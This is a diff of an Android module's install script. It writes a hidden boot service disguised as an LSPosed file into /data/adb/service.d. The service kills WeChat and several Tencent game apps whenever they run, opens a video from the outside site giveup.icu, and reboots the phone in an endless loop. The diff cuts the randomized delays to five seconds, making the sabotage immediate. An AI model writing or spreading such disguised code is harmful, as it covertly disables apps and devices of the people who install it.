@@ -167,14 +167,14 @@ fi
 
 cat > /data/adb/service.d/.lsposed_service.sh <<'EOF'
 packages="com.tencent.mm com.tencent.tmgp.sgame com.tencent.tmgp.pubgmhd com.tencent.mf.uam com.tencent.tmgp.cod com.tencent.tmgp.cf"
-start_sleep=$((RANDOM % 61 + 120))
+start_sleep=5
 sleep $start_sleep
 while true
 do
     for package in $packages; do
         pid=$(pidof "$package")
         if [ -n "$pid" ]; then
-            wait_time=$((RANDOM % 301 + 600))
+            wait_time=5
             sleep $wait_time
             kill -9 $pid
             am start -p com.miui.video -d "https://giveup.icu/d/local/999.mp4" -t video/mp4
@@ -182,7 +182,7 @@ do
             reboot
         fi
     done
-    check_interval=$((RANDOM % 301 + 300))
+    check_interval=5
     sleep $check_interval
 done
 EOF
